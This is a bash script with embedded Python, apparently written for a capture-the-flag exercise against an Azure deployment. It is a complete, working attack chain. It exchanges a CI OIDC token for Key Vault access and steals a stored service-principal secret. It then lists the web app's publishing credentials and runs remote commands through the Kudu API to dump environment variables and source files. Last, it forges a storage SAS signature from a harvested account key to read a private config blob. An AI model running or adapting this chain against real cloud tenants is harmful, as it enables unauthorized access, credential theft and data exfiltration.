#!/usr/bin/env bash
# Kudu command API (publishing creds) -> printenv + read source of reporting app -> connstring -> flag blob.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
SCM="https://$APPR.scm.azurewebsites.net"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
KVP=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
RS=$(curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" | jq -r .value)
RA=$(echo "$RS"|jq -r .appId); RK=$(echo "$RS"|jq -r .clientSecret)
MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$RA" -d grant_type=client_credentials -d "client_secret=$RK" --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/publishingcredentials/list?api-version=2023-12-01" > /tmp/pc.json
U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')

echo "### warm up app + scm"
curl -s -m 60 -o /dev/null -w "app /: %{http_code}\n" "https://$APPR.azurewebsites.net/"
for i in 1 2 3 4 5; do C=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -H "Authorization: Basic $BA" "$SCM/api/settings"); echo "scm warm $i: $C"; [ "$C" = "200" ] && break; sleep 5; done

kudu_cmd(){ curl -s -m 90 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command" -d "{\"command\":\"$1\",\"dir\":\"site/wwwroot\"}"; }

echo "### printenv (look for CONFIG_STORAGE_CONNECTION / DF26)"
kudu_cmd "printenv" > /tmp/env.json; jq -r '.Output' /tmp/env.json 2>/dev/null | grep -iE "CONFIG_STORAGE|STORAGE|CONNECTION|DF26|ACCOUNT|SECRET|VAULT|IDENTITY" ; echo "(exit $(jq -r '.ExitCode' /tmp/env.json 2>/dev/null))"
echo "### ls wwwroot"
kudu_cmd "ls -la" | jq -r '.Output' 2>/dev/null
echo "### cat python sources"
kudu_cmd "cat *.py 2>/dev/null; echo ---; cat *.json 2>/dev/null; echo ---; cat *.txt 2>/dev/null" | jq -r '.Output' 2>/dev/null | head -c 4000

echo "### parse env for storage connstring and READ flag blob"
jq -r '.Output' /tmp/env.json 2>/dev/null > /tmp/env.txt
python3 - <<'PY'
import re,base64,hmac,hashlib,urllib.parse,urllib.request
env=open('/tmp/env.txt').read()
for line in env.splitlines():
    if 'DF26{' in line: print("FLAG ENV:",line)
m=re.findall(r'(DefaultEndpointsProtocol=.*?AccountKey=[^;\s]+;?[^\s]*)', env)
# also AccountName/AccountKey separate
for cs in set(m):
    d=dict(p.split('=',1) for p in cs.split(';') if '=' in p)
    acct=d.get('AccountName'); key=d.get('AccountKey')
    if not (acct and key): continue
    print("CONNSTR acct",acct)
    sv="2021-08-06"; sts="\n".join([acct,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
    def g(u):
        try: return urllib.request.urlopen(urllib.request.Request(u,headers={"x-ms-version":sv}),timeout=20).read().decode('utf-8','replace')
        except Exception as e:
            try: return e.read().decode('utf-8','replace')
            except: return str(e)
    print("  config blobs:", re.findall(r"<Name>([^<]+)</Name>", g(f"https://{acct}.blob.core.windows.net/config?restype=container&comp=list&{sas}")))
    print("  >>> internal-config.json:\n", g(f"https://{acct}.blob.core.windows.net/config/internal-config.json?{sas}"))
PY
echo "=== DONE ==="
